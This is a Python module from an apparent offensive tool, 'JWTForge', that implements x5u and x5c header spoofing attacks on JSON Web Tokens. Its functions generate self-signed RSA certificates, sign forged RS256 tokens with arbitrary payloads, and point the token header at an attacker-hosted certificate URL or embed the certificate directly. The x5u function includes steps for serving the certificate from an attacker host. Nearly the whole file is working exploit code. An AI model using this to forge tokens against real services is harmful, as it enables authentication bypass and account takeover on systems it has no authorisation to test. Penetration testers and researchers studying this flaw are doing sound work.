"""
JWTForge - X5U (X.509 Certificate URL) Spoofing Attack

The 'x5u' header parameter specifies a URL to an X.509 certificate
or certificate chain used for token verification.

Attack:
  1. Generate a self-signed RSA certificate
  2. Host the certificate at an attacker-controlled URL
  3. Create JWT with x5u pointing to our certificate URL
  4. Sign with our private key

If the server fetches and trusts the certificate without validation,
it will accept our forged token.

Variant — x5c (X.509 Certificate Chain in header):
  Embed the certificate directly in the JWT header (no hosting needed).
  Some implementations trust the certificate embedded in the token itself.

References:
  - https://portswigger.net/web-security/jwt
  - RFC 7515 Section 4.1.5 (x5u) and 4.1.6 (x5c)
"""

import json
import base64
from typing import Dict, Any, Optional
from datetime import datetime, timedelta, timezone

from ..core.parser import JWTParser, b64url_encode


def generate_self_signed_cert(
    common_name: str = 'jwtforge.attacker.com',
    key_size: int = 2048,
    valid_days: int = 365,
):
    """Generate a self-signed X.509 certificate and private key."""
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography import x509
    from cryptography.x509.oid import NameOID

    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=key_size,
        backend=default_backend()
    )

    subject = issuer = x509.Name([
        x509.NameAttribute(NameOID.COMMON_NAME, common_name),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, 'JWTForge'),
        x509.NameAttribute(NameOID.COUNTRY_NAME, 'US'),
    ])

    now = datetime.now(timezone.utc)
    cert = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(issuer)
        .public_key(private_key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now)
        .not_valid_after(now + timedelta(days=valid_days))
        .add_extension(
            x509.SubjectAlternativeName([x509.DNSName(common_name)]),
            critical=False,
        )
        .sign(private_key, hashes.SHA256(), default_backend())
    )

    return private_key, cert


def cert_to_pem(cert) -> str:
    """Serialize certificate to PEM format."""
    from cryptography.hazmat.primitives import serialization
    return cert.public_bytes(serialization.Encoding.PEM).decode()


def cert_to_der_b64(cert) -> str:
    """Serialize certificate to DER base64 (for x5c header)."""
    from cryptography.hazmat.primitives import serialization
    der = cert.public_bytes(serialization.Encoding.DER)
    return base64.b64encode(der).decode()


def sign_token_rs256(private_key, signing_input: bytes) -> bytes:
    """Sign bytes with RSA-SHA256."""
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.asymmetric import padding
    return private_key.sign(signing_input, padding.PKCS1v15(), hashes.SHA256())


def attack_x5u(
    token: str,
    attacker_host: str = '127.0.0.1',
    attacker_port: int = 8888,
    custom_x5u_url: Optional[str] = None,
    common_name: str = 'jwtforge.attacker.com',
    custom_payload: Dict = None,
) -> Dict[str, Any]:
    """
    X5U spoofing attack — forge JWT pointing to attacker-controlled certificate.

    Args:
        token: Original JWT string
        attacker_host: Host where certificate will be served
        attacker_port: Port for certificate server
        custom_x5u_url: Override the x5u URL directly
        common_name: CN for the self-signed certificate
        custom_payload: Modified payload claims

    Returns:
        Result dict with forged token, certificate PEM, and server instructions
    """
    try:
        private_key, cert = generate_self_signed_cert(common_name)
        parser = JWTParser(token)
        payload = custom_payload if custom_payload is not None else parser.payload

        x5u_url = custom_x5u_url or f"http://{attacker_host}:{attacker_port}/cert.pem"
        cert_pem = cert_to_pem(cert)

        # Build new header
        new_header = {
            'alg': 'RS256',
            'typ': 'JWT',
            'x5u': x5u_url,
        }

        h = b64url_encode(json.dumps(new_header, separators=(',', ':')).encode())
        p = b64url_encode(json.dumps(payload, separators=(',', ':')).encode())
        signing_input = f"{h}.{p}".encode()

        sig_bytes = sign_token_rs256(private_key, signing_input)
        sig_b64 = b64url_encode(sig_bytes)
        forged_token = f"{h}.{p}.{sig_b64}"

        # Private key PEM for reference
        from cryptography.hazmat.primitives import serialization
        private_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption()
        ).decode()

        return {
            'attack': 'x5u_spoof',
            'status': 'success',
            'token': forged_token,
            'x5u_url': x5u_url,
            'cert_pem': cert_pem,
            'private_key_pem': private_pem,
            'note': f'Host certificate PEM at {x5u_url} and submit forged token',
            'detail': f'X5U → {x5u_url}',
            'server_instructions': (
                f"1. Start JWTForge server: jwtforge server --port {attacker_port}\n"
                f"   (automatically serves cert at /cert.pem)\n"
                f"2. Or: python3 -m http.server {attacker_port}\n"
                f"   (place cert.pem in current directory)\n"
                f"3. Ensure target can reach {attacker_host}:{attacker_port}/cert.pem"
            ),
        }

    except ImportError:
        return {
            'attack': 'x5u_spoof',
            'status': 'error',
            'detail': 'cryptography library required: pip install cryptography',
        }
    except Exception as e:
        return {
            'attack': 'x5u_spoof',
            'status': 'error',
            'detail': str(e),
        }


def attack_x5c_embedded(
    token: str,
    custom_payload: Dict = None,
) -> Dict[str, Any]:
    """
    X5C (embedded certificate chain) attack.

    Embed a self-signed certificate directly in the 'x5c' JWT header.
    Some implementations trust the embedded certificate without external validation.

    No server needed — everything is in the token itself.
    """
    try:
        private_key, cert = generate_self_signed_cert('jwtforge-embedded.local')
        parser = JWTParser(token)
        payload = custom_payload if custom_payload is not None else parser.payload

        cert_der_b64 = cert_to_der_b64(cert)

        new_header = {
            'alg': 'RS256',
            'typ': 'JWT',
            'x5c': [cert_der_b64],  # Array of base64-encoded DER certificates
        }

        h = b64url_encode(json.dumps(new_header, separators=(',', ':')).encode())
        p = b64url_encode(json.dumps(payload, separators=(',', ':')).encode())
        signing_input = f"{h}.{p}".encode()

        sig_bytes = sign_token_rs256(private_key, signing_input)
        forged_token = f"{h}.{p}.{b64url_encode(sig_bytes)}"

        return {
            'attack': 'x5c_embedded',
            'status': 'success',
            'token': forged_token,
            'note': 'Self-signed cert embedded in x5c header — no server required',
            'detail': 'Embedded x5c self-signed certificate injection',
        }

    except ImportError:
        return {
            'attack': 'x5c_embedded',
            'status': 'error',
            'detail': 'cryptography library required: pip install cryptography',
        }
    except Exception as e:
        return {
            'attack': 'x5c_embedded',
            'status': 'error',
            'detail': str(e),
        }
